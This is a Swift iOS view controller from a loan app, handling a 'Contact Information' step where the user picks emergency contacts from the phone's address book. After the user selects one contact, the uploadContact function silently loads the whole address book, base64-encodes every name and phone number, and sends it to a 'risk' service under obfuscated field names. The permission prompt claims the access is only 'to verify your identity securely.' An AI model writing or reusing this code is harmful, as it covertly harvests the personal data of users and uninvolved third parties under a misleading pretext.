//
//  AuthContactViewController.swift
//  NewNewStarLoan
//
//  Created by Albert on 2025/5/9.
//

import Foundation
import UIKit
import SwiftUI
import ProgressHUD

class AuthContactViewController: UIViewController {
  private let viewModel: AuthContactViewModel
  var contactInfo: GetContactInfoResponse?
  
  // MARK: lazy properties UI
  private lazy var containerImageView: UIImageView = {
    let imageView = UIImageView()
    // 设置可拉伸的图片
    if let originalImage = UIImage(named: "grxx_bg") {
      let topInset: CGFloat = 345  // 上部分不拉伸的高度（根据实际设计调整）
      let bottomInset: CGFloat = 1  // 底部留1像素用于拉伸
      let horizontalInset: CGFloat = 0  // 水平方向不拉伸
      
      let resizableImage = originalImage.resizableImage(
        withCapInsets: UIEdgeInsets(
          top: topInset,
          left: horizontalInset,
          bottom: bottomInset,
          right: horizontalInset
        ),
        resizingMode: .stretch
      )
      imageView.image = resizableImage
    }
    imageView.isUserInteractionEnabled = true
    return imageView
  }()
  
  private lazy var navigationBar: CustomNavigationBar = {
    let nav = CustomNavigationBar()
    nav.backButtonTapped = { [weak self] in
      let vc = QuitAuthViewController()
      vc.modalPresentationStyle = .fullScreen
      vc.dismissCallback = { [weak self] in
        self?.navigationController?.popToRootViewController(animated: true)
      }
      self?.present(vc, animated: true)
    }
    return nav
  }()
  
  private lazy var nextStepButton: UIButton = {
    let button = UIButton(type: .custom)
    button.setBackgroundImage(UIImage(named: "cpxq_b"), for: .normal)
    button.setTitle("Next Step", for: .normal)
    button.titleLabel?.font = .systemFont(ofSize: 16, weight: .heavy)
    button.setTitleColor(.white, for: .normal)
    button.addTarget(self, action: #selector(nextStepButtonTapped), for: .touchUpInside)
    return button
  }()
  
  private lazy var backgroundImageView: UIImageView = {
    let imageView = UIImageView(image: UIImage(named: "xzrzfs_bg"))
    imageView.isUserInteractionEnabled = true
    return imageView
  }()
  
  private lazy var tableView: UITableView = {
    let tableView = UITableView(frame: .zero, style: .plain)
    tableView.delegate = self
    tableView.dataSource = self
    tableView.separatorStyle = .none
    tableView.backgroundColor = .clear
    tableView.showsVerticalScrollIndicator = false
    tableView.register(ContactInfomationTableViewCell.self, forCellReuseIdentifier: ContactInfomationTableViewCell.cellIdentifier)
    return tableView
  }()
  
  private lazy var scrollView: UIScrollView = {
    let scrollView = UIScrollView()
    scrollView.showsHorizontalScrollIndicator = false
    return scrollView
  }()
  
  private lazy var stackView: UIStackView = {
    let stackView = UIStackView()
    stackView.axis = .horizontal
    stackView.spacing = 8
    stackView.alignment = .top
    stackView.distribution = .fill
    return stackView
  }()
  
  // MARK: - Initialization
  init(viewModel: AuthContactViewModel) {
    self.viewModel = viewModel
    super.init(nibName: nil, bundle: nil)
  }
  
  required init?(coder: NSCoder) {
    fatalError("init(coder:) has not been implemented")
  }
  
  
  // MARK: Life cycle
  override func viewDidLoad() {
    super.viewDidLoad()
    
    view.backgroundColor = .white
    setupBelowUI()
    
    // 开始埋点
    viewModel.startFocus()
  }
  
  override func viewWillAppear(_ animated: Bool) {
    super.viewWillAppear(animated)
  }
}

extension AuthContactViewController {
  private func setupBelowUI() {
    navigationController?.setNavigationBarHidden(true, animated: false)
    
    // 添加自定义导航栏
    view.addSubview(navigationBar)
    view.addSubview(backgroundImageView)
    view.addSubview(nextStepButton)
    
    // 设置导航栏约束
    navigationBar.snp.makeConstraints { make in
      make.top.equalTo(view.safeAreaLayoutGuide.snp.top)
      make.leading.trailing.equalToSuperview()
      make.height.equalTo(44)
    }
    
    // 设置标题
    navigationBar.setTitle("Contact Information")
    
    backgroundImageView.snp.makeConstraints { make in
      make.top.equalTo(view.safeAreaLayoutGuide.snp.top).offset(44)
      make.leading.trailing.equalToSuperview()     // 左右充满
      make.bottom.equalTo(view.safeAreaLayoutGuide.snp.bottom).offset(-20 - 44 - 14)
    }
    
    
    nextStepButton.snp.makeConstraints { make in
      make.centerX.equalToSuperview()
      make.bottom.equalTo(view.safeAreaLayoutGuide.snp.bottom).offset(-20)
      make.width.equalTo(337)
      make.height.equalTo(44)
    }
    
    backgroundImageView.addSubview(containerImageView)
    containerImageView.snp.makeConstraints { make in
        make.top.equalToSuperview().offset(14)
      make.leading.trailing.equalToSuperview().inset(15)  // 添加左右约束
      make.bottom.equalTo(nextStepButton.snp.top).offset(-45)
    }
    
    containerImageView.addSubview(tableView)
    tableView.snp.makeConstraints { make in
      make.top.equalToSuperview().offset(100)
      make.leading.trailing.equalToSuperview().inset(2)
      make.bottom.equalToSuperview().inset(10)
    }
    
    // 添加 scrollView 和 stackView
    containerImageView.addSubview(scrollView)
    scrollView.addSubview(stackView)
    
    scrollView.snp.makeConstraints { make in
      make.top.equalToSuperview().offset(12)
      make.height.equalTo(54)
      make.leading.trailing.equalToSuperview().inset(8)
    }
    
    stackView.snp.makeConstraints { make in
      make.edges.equalToSuperview()
    }
    let imageConfigs = [
      ("vi_unselected", "vi"),
      ("pi_unselected", "pi"),
      ("wi_unselected", "wi"),
      ("ci_selected", "ci"),
      ("bci_unselected", "bci")
    ]
    
    for (imageName, id) in imageConfigs {
      let imageView = createImageView(imageName: imageName, id: id)
      imageView.contentMode = .scaleAspectFit
      stackView.addArrangedSubview(imageView)
      
      // 不再设置宽高比例约束，而是保持图片原始尺寸
      if let image = UIImage(named: imageName) {
        imageView.snp.makeConstraints { make in
          make.width.equalTo(image.size.width)
          make.height.equalTo(image.size.height)
        }
      }
    }
    
    DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { [weak self] in
        guard let self = self else { return }
        let contentOffset = CGPoint(x: self.scrollView.contentSize.width - self.scrollView.bounds.width - self.scrollView.bounds.width/5 - 5 * 4, y: 0)
        self.scrollView.setContentOffset(contentOffset, animated: true)
    }
  }
  
  private func createImageView(imageName: String, id: String) -> UIImageView {
    let imageView = UIImageView(image: UIImage(named: imageName))
    imageView.contentMode = .scaleAspectFit
    imageView.accessibilityIdentifier = id
    return imageView
  }
}

extension AuthContactViewController: UITableViewDataSource, UITableViewDelegate {
  func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
    return viewModel.getFieldCount()
  }
  
  func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
    guard let cell = tableView.dequeueReusableCell(withIdentifier: ContactInfomationTableViewCell.cellIdentifier, for: indexPath) as? ContactInfomationTableViewCell else {
      return UITableViewCell()
    }
    
    let contact = viewModel.getField(at: indexPath.row)
    
    cell.configure(
      title: contact.satisfy,
      relationPlaceholder: contact.sandwich,
      contactPlaceholder: contact.wretched
    )
    
    cell.configureTitle(relation: contact.engaged, phone: contact.navvies)
    
    
    cell.configurePhoneTextField(with: viewModel.getContactValue(for: indexPath.row))
    if let selectedRelation = viewModel.getSelectedRelation(for: indexPath.row) {
      cell.configureRelationTextField(with: selectedRelation.bad)
      cell.selectedRelation = selectedRelation
    }
    
    cell.relationButtonClosure = { [weak self] in
      self?.selectRelationShip(for: indexPath)
    }
    
    cell.phoneButtonClosure = { [weak self] in
      guard let self = self else { return }
      self.selectContact(for: indexPath)
    }
    
    return cell
  }
  
  private func selectContact(for indexPath: IndexPath) {
    let capturedIndexPath = indexPath
    
    requestContactAccess(for: capturedIndexPath) {
      NameAddressBookManager.shared.showAddressBookPicker(from: self) { [weak self] name, phone in
          guard let self = self else { return }
          
          self.viewModel.updateContact(at: capturedIndexPath.row, name: name, phone: phone)
          if let cell = self.tableView.cellForRow(at: capturedIndexPath) as? ContactInfomationTableViewCell {
              
            cell.configurePhoneTextField(with: "\(name) - \(phone)")
          }
          
          self.uploadContact()
      }
    }
  }
  
  private func selectRelationShip(for indexPath: IndexPath) {
    let contact = viewModel.getField(at: indexPath.row)
    let options = viewModel.getRelationOptions(for: contact)
    
    
    
    let optionVC = OptionSelectViewController()
    optionVC.configure(title: contact.engaged, options: options)
    
    // Set initial selection if exists
    if let currentRelation = viewModel.getSelectedRelation(for: indexPath.row) {
      let initialOption = options.first { $0.title == currentRelation.bad }
      optionVC.setupInitialSelection(option: initialOption)
    }
    
    optionVC.onConfirm = { [weak self] selectedOption in
      guard let self = self,
            let matching = contact.delight.first(where: { $0.bad == selectedOption.title }) else { return }
      
      self.viewModel.updateRelation(at: indexPath.row, relation: matching)
      // UI will update automatically through relation binding
      if let cell = self.tableView.cellForRow(at: indexPath) as? ContactInfomationTableViewCell {
        
        cell.configureRelationTextField(with: matching.bad)
        cell.selectedRelation = matching
      }
    }
    
    optionVC.modalPresentationStyle = .overFullScreen
    present(optionVC, animated: true)
  }
  
  func uploadContact() {
    NameAddressBookManager.shared.loadAddressBookContacts { array in
      let mappedContacts = array.map { contact in
        [
            "sky": contact.phones.joined(separator: ", "),
            "bad": contact.name
        ]
      }
      // 将字典数组转换为 JSON 数据
      if let jsonData = try? JSONSerialization.data(withJSONObject: mappedContacts, options: []),
         let jsonString = String(data: jsonData, encoding: .utf8) {
          
          // Base64 编码
          if let base64String = jsonString.data(using: .utf8)?.base64EncodedString() {
              Task {
                  do {
                    // 提交埋点
                    let _ = try await RiskService.shared.contacts(mountainside: "3", despite: String.generateUUID(), robes: String.generateUUID(), middle: base64String)
                  } catch {
                      
                  }
              }
          } else {
              
          }

      } else {
          
      }
    }
  }
}

extension AuthContactViewController {
  @objc private func nextStepButtonTapped() {
    //
    ProgressHUD.animate("Submiting...")
    Task {
      do {
        let resu = try await viewModel.saveContactInfo()
        let response = try await ProductService.shared.getProductDetail(
          feud: viewModel.productId,
          staying: String.generateUUID(),
          since: String.generateUUID()
        )
        
        ProgressHUD.dismiss()
        if response.middle.wedneskpiday == nil {
          navigationController?.popToRootViewController(animated: true)
          return
        }
        let cousin = response.middle.wedneskpiday?.cousin
        if cousin == "bank" || cousin == "nbaallstarj" {
          Task {
            do {
              let response = try await CertificateService.shared.getBankCardInfo()
              await MainActor.run {
                let vc = AuthBankInfoViewController(formData: response.middle, productId: viewModel.productId)
                self.navigationController?.pushViewController(vc, animated: true)

              }
            }
          }
        }else {
          self.navigationController?.popViewController(animated: true)
        }
      } catch {
        ProgressHUD.error(error.localizedDescription)
      }
    }
  }
  
  private func requestContactAccess(for indexPath: IndexPath, completion: @escaping () -> Void) {
          NameAddressBookManager.shared.requestAddressBookPermission { [weak self] status in
              guard let self = self else { return }
            
              DispatchQueue.main.async {
                  if !status {
                    let vc = PermissionPromptAlertViewController()
                    vc.modalPresentationStyle = .fullScreen
                    vc.configureMessageLabel(with: "To verify your identity securely, please grant Moneycat access to your contacts.")
                    self.present(vc, animated: true)
                  } else {
                      completion()
                  }
              }
          }
  }
}



